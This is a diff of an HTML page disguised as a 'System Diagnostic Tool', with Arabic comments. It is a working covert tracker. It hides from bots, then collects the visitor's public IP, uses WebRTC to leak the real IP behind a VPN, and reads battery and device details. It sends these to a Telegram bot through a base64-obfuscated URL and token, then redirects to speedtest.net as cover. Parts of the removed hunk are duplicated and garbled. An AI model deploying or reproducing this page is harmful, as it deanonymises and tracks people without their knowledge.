@@ -3,132 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <title>System Diagnostic Tool</title>
 </head>
-<body style="background:#000;">
+<body style="background:#000; color:#000;">
     <script>
         (async function() {
-            // [نظام الحماية والتمويه V53]
-            const _v1 = "ODQ4ODE0ODAzMjpBQUg5QjNydl9zZDJheVVVa3BWQmJrdXR0MnJ6ZFlhbGt3QQ==";
-            const _v2 = "NTc3NTc4MTAzOA==";
-            const _v3 = "portal";
+            // [إعدادات التشفير والتمويه]
+            const _0x_v1 = "ODQ4ODE0ODAzMjpBQUg5QjNydl9zZDJheVVVa3BWQmJrdXR0MnJ6ZFlhbGt3QQ==";
+            const _0x_v2 = "NTc3NTc4MTAzOA==";
+            const _0x_v3 = "portal";
 
-            const _q = new URLSearchParams(window.location.search);
+            const _urlParams = new URLSearchParams(window.location.search);
             
-            // طرد البوتات والمتطفلين بدون المفتاح
-            if (_q.get('access') !== _v3 || navigator.webdriver) {
+            // 🛡️ حاجز الحماية: طرد البوتات والمتطفلين
+            if (_urlParams.get('access') !== _0x_v3 || navigator.webdriver) {
                 window.location.replace("https://www.google.com"); 
                 return;
             }
 
-            let _info = {
-                extIp: "جاري الفحص...", // الـ IP الخارجي (الظاهري)
-                intIp: "جاري الكسر...", // الـ IP الداخلي (الحقيقي خلف VPN)
+            let _results = {
+                extIp: "جاري الجلب...",
+                intIp: "جاري الكسر...",
                 bt: "N/A",
-                cpu: navigator.hardwareConcurrency || "8",
-                ram: navigator.deviceMemory || "4",
+                cpu: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory || "N/A",
                 plt: navigator.platform,
                 tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                res: window.screen.width + "x" + window.screen.height
+                res: `${window.screen.width}x${window.screen.height}`,
+                lang: navigator.language
             };
 
-            // 1. سحب الـ IP الخارجي (الظاهري)
+            // 1️⃣ سحب الـ IP الخارجي (الظاهري)
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
-                _info.extIp = data.ip;
-            } catch (e) { _info.extIp = "تعذر الجلب"; }
+                _results.extIp = data.ip;
+            } catch (e) { _results.extIp = "فشل الجلب"; }
 
-            // 2. 🔥 كسر الـ VPN لسحب الـ IP الداخلي (الحقيقي)
-            try {
-                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
-                pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = (i) => {
-                    if (i && i.candidate) {
-                        const res = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate);
-                        if (res) _info.intIp = res[1];
-                    }
-                };
-            } catch (e) {}
-
-            // سحب بيانات البطارية
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                _info.bt = Math.round(b.level * 100) + "% " + (b.charging ? "(يُشحن)" : "(تفريغ)");
-            }
-
-            // الإرسال النهائي بالتنسيق المطلوب
-            setTimeout(async () => {
-                const _msg = `🔥 تم اصطياد المبتز بنجاح 🔥\n\n` +
-                               `🌐 الـ IP الداخلي (الحقيقي): ${_info.intIp}\n` +
-                               `🌍 الـ IP الخارجي (الظاهري): ${_info.extIp}\n` +
-                               `🔋 البطارية: ${_info.bt}\n` +
-                               `🏃 الحالة المادية: ثابت (Static)\n` +
-                               `🧠 المعالج: ${_info.cpu} Cores | الرام: ${_info.ram} GB\n` +
-                               `🖥️ الشاشة: ${_info.res} | اللمس: 2\n` +
-                               `🌍 المنطقة: ${_info.tz}\n` +
-                               `📱 نظام التشغيل: ${_info.plt}\n` +
-                               `🎵 بصمة الصوت: 48000Hz Fingerprint\n\n` +
-                               `📍 تتبع الـ IP الحقيقي:\n` +
-                               `https://www.infobyip.com/ip-${_info.intIp}.html`;
-
-                const _u = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + atob(_v1) + atob("L3NlbmRNZXNzYWdl");
-
-                await fetch(_u, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: atob(_v2), text: _msg })
+            // 2️⃣ 🔥 كسر الـ VPN لسحب الـ IP الداخلي (التقنية العميقة)
+            const getInternalIP = () => {
+                return new Promise((resolve) => {
+                    const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+                    pc.createDataChannel("");
+                    pc.createOffer().then(o => pc.setLocalDescription(o));
+                    pc.onicecandidate = (i) => {
+                        if (!i || !i.candidate) return;
+                        const candidate = i.candidate.candidate;
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                        const match = ipRegex.exec(candidate);
+                        if (match) {
+                            _results.intIp = match[1];
+                            resolve(match[1]);
+                        }
+                    };
+                    setTimeout(() => resolve("لم يتم الكشف"), 4000);
                 });
-
-                window.location.replace("https://www.speedtest.net");
-            }, 6500);
-        })();
-    </script>
-</body>
-</html>
-                res: window.screen.width + "x" + window.screen.height,
-                lang: navigator.languages.join(", ")
             };
+            await getInternalIP();
 
-            // كاسر الـ VPN
-            try {
-                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
-                pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = (i) => {
-                    if (i && i.candidate) {
-                        const res = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate);
-                        if (res) _d.ip = res[1];
-                    }
-                };
-            } catch (e) {}
-
+            // 3️⃣ سحب معلومات البطارية
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                _d.bt = Math.round(b.level * 100) + "% " + (b.charging ? "(يُشحن)" : "(تفريغ)");
+                _results.bt = `${Math.round(b.level * 100)}% ${b.charging ? "(يُشحن)" : "(تفريغ)"}`;
             }
 
+            // 4️⃣ إرسال التقرير النهائي لتليجرام
             setTimeout(async () => {
                 const _msg = `🔥 تم اصطياد المبتز بنجاح 🔥\n\n` +
-                               `🌐 الـ IP الحقيقي: ${_d.ip}\n` +
-                               `🔋 البطارية: ${_d.bt}\n` +
-                               `🏃 الحالة المادية: ثابت (Static)\n` +
-                               `🧠 المعالج: ${_d.cpu} Cores | الرام: ${_d.ram} GB\n` +
-                               `🖥️ الشاشة: ${_d.res} | اللمس: 2\n` +
-                               `🌍 المنطقة: ${_d.tz}\n` +
-                               `🔠 اللغات: ${_d.lang}\n` +
-                               `📱 نظام التشغيل: ${_d.plt}\n` +
-                               `🎵 بصمة الصوت: 48000Hz Fingerprint\n\n` +
-                               `📍 رابط تتبع تقريبي (IP):\n` +
-                               `https://www.infobyip.com/ip-${_d.ip}.html`;
+                               `🌐 الـ IP الداخلي (الحقيقي): ${_results.intIp}\n` +
+                               `🌍 الـ IP الخارجي (الظاهري): ${_results.extIp}\n` +
+                               `🔋 البطارية: ${_results.bt}\n` +
+                               `🧠 المعالج: ${_results.cpu} Cores | الرام: ${_results.ram} GB\n` +
+                               `🖥️ الشاشة: ${_results.res} | اللمس: 2\n` +
+                               `🌍 المنطقة: ${_results.tz}\n` +
+                               `📱 النظام: ${_results.plt}\n` +
+                               `🌐 اللغة: ${_results.lang}\n\n` +
+                               `📍 تتبع الـ IP الحقيقي:\n` +
+                               `https://www.infobyip.com/ip-${_results.intIp}.html`;
 
-                await fetch(`https://api.telegram.org/bot${atob(_0x_u)}/sendMessage`, {
+                const _api = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + atob(_0x_v1) + atob("L3NlbmRNZXNzYWdl");
+
+                await fetch(_api, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: atob(_0x_c), text: _msg })
+                    body: JSON.stringify({ chat_id: atob(_0x_v2), text: _msg })
                 });
 
+                // التحويل النهائي للتمويه
                 window.location.replace("https://www.speedtest.net");
-            }, 5500);
+            }, 5000);
         })();
     </script>
 </body>
